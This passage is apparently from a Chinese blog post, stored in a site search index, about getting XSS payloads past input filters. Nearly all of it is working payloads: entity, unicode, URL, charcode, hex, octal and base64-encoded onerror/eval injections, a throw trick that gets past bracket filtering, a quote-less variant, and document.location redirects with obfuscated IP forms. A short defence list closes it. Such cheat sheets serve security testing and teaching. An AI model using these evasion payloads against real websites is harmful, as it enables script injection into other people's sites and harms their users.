onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;url编码绕过&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;Ascii码绕过&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;Hex绕过&lt;img src=x onerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;八进制绕过&lt;img src=x onerror=alert(&#39;\170\163\163&#39;)&gt;base64绕过&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre><p>过滤双引号，单引号</p><pre><code>如果是html标签中，我们可以不用引号；如果是在js中，我们可以用反引号代替单双引号&lt;img src=&quot;x&quot; onerror=alert(``xss``);&gt;使用编码绕过，具体看上面列举的例子</code></pre><p>过滤括号</p><pre><code>当括号被过滤的时候可以使用throw来绕过&lt;svg/onload=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;</code></pre><p>过滤url地址</p><pre><code>使用url编码&lt;img src=&quot;x&quot; onerror=document.location=``http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/``&gt;使用IP&lt;img src=&quot;x&quot; onerror=document.location=``http://2130706433/``&gt;十进制&lt;img src=&quot;x&quot; onerror=document.location=``http://0177.0.0.01/``&gt;八进制&lt;img src=&quot;x&quot; onerror=document.location=``http://0x7f.0x0.0x0.0x1/``&gt;十六进制&lt;img src=&quot;x&quot; onerror=document.location=``//www.baidu.com``&gt;html标签中用//可以代替http://使用\ (注意：在windows下\本身就有特殊用途，是一个path 的写法，所以\在Windows下是file协议，在linux下才会是当前域的协议)使用中文逗号代替英文逗号&lt;img src=&quot;x&quot; onerror=&quot;document.location=``http://www.baidu.com``&quot;&gt;//会自动跳转到百度</code></pre><p>htmlspecialchars() 函数实体化HTML</p><pre><code>q&#39; onclick=&#39;alert(123)    //没有实体化引号的情况下</code></pre><p>注：innerHtml不会解析script和svg标签</p><p>原文链接：<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782">https://blog.csdn.net/LYJ20010728/article/details/116462782</a></p><p>拓展链接：<a href="https://blog.csdn.net/hackzkaq/article/details/126344040">https://blog.csdn.net/hackzkaq/article/details/126344040</a></p><p>xss防御：</p><p>​1、过滤</p><p>​2、httponly -&gt;让js无法读取到httponly保护的cookie字段（可以找到探针phpinfo）</p><p>​3、HTML实体化（转义）</p>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
